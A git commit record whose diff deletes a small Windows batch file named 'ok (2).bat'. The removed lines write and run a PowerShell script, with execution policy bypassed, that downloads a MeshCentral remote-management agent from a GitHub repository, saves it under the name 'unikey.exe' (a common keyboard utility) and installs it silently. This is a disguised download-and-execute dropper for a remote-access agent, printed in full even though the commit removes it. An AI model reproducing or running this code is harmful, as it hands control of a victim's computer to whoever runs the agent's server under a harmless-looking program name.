4f9fb298a789cfe89dabc372e59a73abeca7e43b
Ngophuthanh1990 <126806085+Ngophuthanh1990@users.noreply.github.com>
2023-03-29 01:42:18 -0700

    Delete ok (2).bat

--- ok (2).bat
+++
@@ -1,4 +0,0 @@
-echo "$Url = 'https://github.com/Ngophuthanh1990/thanh/raw/main/meshagent64-Kuanhngo%20(1).exe';[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls";$ProgressPreference = 'SilentlyContinue';Invoke-WebRequest $Url -OutFile unikey.exe;.\unikey.exe -fullinstall
-" > install.ps1 
-powershell.exe -ExecutionPolicy Bypass -File install.ps1
-exit
